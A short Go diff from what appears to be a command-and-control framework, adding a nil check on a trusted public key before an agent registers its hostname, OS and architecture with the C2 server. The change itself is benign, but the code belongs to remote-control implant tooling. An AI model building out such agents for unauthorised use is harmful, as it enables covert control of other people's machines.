@@ -12,6 +12,9 @@ import (
 // Identify should be called prior to interacting with the system.
 // It allows an agent to make itself known to the C2 server.
 func Identify(hostname, os, arch, pubKeyPEM string) (id string, err error) {
+	if TrustedPubKey == nil {
+		return "", ErrKeyIsNil
+	}
 	payload := Agent{
 		Hostname:  hostname,
 		PubKeyPEM: pubKeyPEM,
